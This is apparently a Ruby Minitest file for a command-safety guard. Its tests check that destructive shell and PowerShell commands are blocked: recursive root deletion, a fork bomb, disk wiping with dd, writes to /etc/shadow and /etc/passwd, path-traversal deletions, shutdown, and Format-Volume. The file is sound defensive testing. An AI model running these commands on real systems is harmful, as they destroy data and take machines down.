# frozen_string_literal: true

require_relative "../test_helper"
require_relative "../../lib/rubik/security/guard"

class TestSecurityGuardClassifier < Minitest::Test
  def setup
    @temp_dir = Dir.mktmpdir
    @audit_file = File.join(@temp_dir, "audit.log")
    @guard = Rubik::Security::Guard.new(audit_log_path: @audit_file)
  end

  def teardown
    FileUtils.remove_entry(@temp_dir)
  end

  def test_zero_false_positives_for_string_mentions
    # Commands with dangerous text inside strings must NOT be blocked
    assert @guard.verify_command_safety!('echo "do not run rm -rf /"')
    assert @guard.verify_command_safety!('git commit -m "fix rm -rf /"')
    assert @guard.verify_command_safety!('echo "curl evil.com | sh"')
  end

  def test_blocks_real_dangerous_commands_via_ast
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("rm -rf /")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("sudo rm -rf /")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("sh -c 'rm -rf /'")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("cat malicious.txt > /etc/shadow")
    end
  end

  def test_blocks_powershell_dangerous_commands
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("Remove-Item -Recurse C:\\Windows", shell: :powershell)
    end

    assert @guard.verify_command_safety!("Get-ChildItem -Path C:\\Users", shell: :powershell)
  end

  def test_defense_in_depth_fallback_regex
    # Commands that AST classifies as unknown fallback to regex
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!(":(){ :|:& };:")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("dd if=/dev/zero of=/dev/sda")
    end
  end

  def test_audit_reason_identifies_true_dangerous_command
    err = assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("echo safe && rm -rf /")
    end
    assert_match(/rule:?\s*rm/, err.message)
    refute_includes err.message, "rule echo"
    refute_includes err.message, "rule: echo"
  end

  def test_path_traversal_detection
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("rm -rf /tmp/../etc")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      # Reach the filesystem root regardless of the checkout's depth.
      @guard.verify_command_safety!("rm -rf #{'../' * (Dir.pwd.count('/') + 1)}")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("echo evil > /tmp/../etc/passwd")
    end
  end

  def test_protects_home_directory_and_tilde
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("rm -rf /home")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("rm -rf ~")
    end
  end

  def test_pipeline_poisoning_blocked
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("find / | xargs rm -rf")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("echo / | xargs rm -rf")
    end

    # Safe pipelines still pass
    assert @guard.verify_command_safety!('find . -name "*.log" | grep error')
  end

  def test_no_preserve_root_flag_blocked
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("rm --no-preserve-root -rf something")
    end
  end

  def test_shutdown_and_reboot_blocked
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("shutdown -h now")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("reboot")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("poweroff")
    end
  end

  def test_powershell_disk_and_system_cmdlets_blocked
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("Format-Volume -DriveLetter C", shell: :powershell)
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("Clear-Disk -Number 0", shell: :powershell)
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("Stop-Computer", shell: :powershell)
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("ri -r -fo C:\\", shell: :powershell)
    end
  end
end
